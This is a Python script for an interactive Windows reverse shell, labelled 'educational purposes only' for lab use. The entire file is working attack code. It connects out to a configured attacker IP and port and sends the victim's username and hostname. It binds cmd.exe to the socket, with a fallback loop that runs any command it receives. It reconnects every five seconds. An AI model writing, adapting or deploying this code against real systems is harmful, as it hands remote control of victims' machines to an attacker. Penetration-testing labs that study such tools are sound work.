#!/usr/bin/env python3
"""
Interactive Windows Reverse Shell
Educational purposes only - Use in controlled lab environment
This version maintains persistent shell state (cd commands work)
"""

import socket
import subprocess
import os
import sys
import time

# Import configuration from root directory
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
import config

# Configuration from config.py
ATTACKER_IP = config.ATTACKER_IP
ATTACKER_PORT = config.ATTACKER_PORT

def create_interactive_shell():
    """Create a persistent interactive shell that maintains state"""
    while True:
        try:
            # Create socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            # Send initial connection message
            hostname = os.getenv('COMPUTERNAME', 'Unknown')
            username = os.getenv('USERNAME', 'Unknown')
            initial_msg = f"[+] Interactive Shell - Connection from {username}@{hostname}\n"
            s.send(initial_msg.encode())
            
            # Method 1: Direct shell binding (most effective)
            try:
                # Duplicate socket to stdin, stdout, stderr
                import msvcrt
                import threading
                
                # Create persistent cmd process
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESTDHANDLES
                startupinfo.hStdInput = msvcrt.get_osfhandle(s.fileno())
                startupinfo.hStdOutput = msvcrt.get_osfhandle(s.fileno())
                startupinfo.hStdError = msvcrt.get_osfhandle(s.fileno())
                
                # Start cmd.exe with socket handles
                process = subprocess.Popen(['cmd.exe'], 
                                         startupinfo=startupinfo,
                                         stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE,
                                         text=True)
                
                # Handle input/output
                def handle_input():
                    while True:
                        try:
                            data = s.recv(1024).decode().strip()
                            if data:
                                process.stdin.write(data + '\n')
                                process.stdin.flush()
                        except:
                            break
                
                def handle_output():
                    while True:
                        try:
                            output = process.stdout.read(1)
                            if output:
                                s.send(output.encode())
                        except:
                            break
                
                input_thread = threading.Thread(target=handle_input, daemon=True)
                output_thread = threading.Thread(target=handle_output, daemon=True)
                
                input_thread.start()
                output_thread.start()
                
                process.wait()
                
            except:
                # Fallback: Manual shell with state preservation
                fallback_shell_with_state(s)
            
            s.close()
            time.sleep(5)
            
        except Exception:
            time.sleep(5)
            continue

def fallback_shell_with_state(s):
    """Fallback shell that manually maintains directory state"""
    current_directory = os.getcwd()
    
    while True:
        try:
            # Send prompt with current directory
            prompt = f"{current_directory}> "
            s.send(prompt.encode())
            
            # Receive command
            command = s.recv(1024).decode().strip()
            
            if not command or command.lower() == 'exit':
                break
            
            # Handle cd command specially
            if command.lower().startswith('cd '):
                try:
                    new_dir = command[3:].strip()
                    if new_dir == '..':
                        new_dir = os.path.dirname(current_directory)
                    elif not os.path.isabs(new_dir):
                        new_dir = os.path.join(current_directory, new_dir)
                    
                    # Normalize path
                    new_dir = os.path.normpath(new_dir)
                    
                    if os.path.exists(new_dir) and os.path.isdir(new_dir):
                        current_directory = new_dir
                        os.chdir(current_directory)
                        result = f"Changed directory to: {current_directory}\n"
                    else:
                        result = f"Directory not found: {new_dir}\n"
                        
                except Exception as e:
                    result = f"cd error: {str(e)}\n"
            
            # Handle other commands
            else:
                try:
                    # Execute command in current directory
                    original_dir = os.getcwd()
                    os.chdir(current_directory)
                    
                    result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=current_directory)
                    
                    # Restore directory
                    os.chdir(original_dir)
                    
                    # Get output
                    output = result.stdout
                    if result.stderr:
                        output += f"\nError: {result.stderr}"
                    
                    result = output if output else "Command executed (no output)\n"
                    
                except Exception as e:
                    result = f"Error executing command: {str(e)}\n"
            
            # Send result
            s.send(result.encode())
            
        except Exception:
            break

def simple_dup_shell():
    """Simple shell using dup2 method (alternative approach)"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        
        # Send banner
        hostname = os.getenv('COMPUTERNAME', 'Unknown')
        username = os.getenv('USERNAME', 'Unknown')
        banner = f"[+] Direct Shell - {username}@{hostname}\n"
        s.send(banner.encode())
        
        # Duplicate socket to standard handles (Windows method)
        import msvcrt
        
        # Get socket handle
        sock_handle = s.fileno()
        
        # Start cmd.exe with socket as stdin/stdout/stderr
        si = subprocess.STARTUPINFO()
        si.dwFlags = subprocess.STARTF_USESTDHANDLES
        si.hStdInput = msvcrt.get_osfhandle(sock_handle)
        si.hStdOutput = msvcrt.get_osfhandle(sock_handle)
        si.hStdError = msvcrt.get_osfhandle(sock_handle)
        
        subprocess.call(['cmd.exe'], startupinfo=si)
        
    except Exception as e:
        # If direct method fails, use fallback
        create_interactive_shell()

def main():
    """Main function - try different shell methods"""
    try:
        # Try the simple dup method first
        simple_dup_shell()
    except:
        # Fall back to interactive shell
        create_interactive_shell()

if __name__ == "__main__":
    main()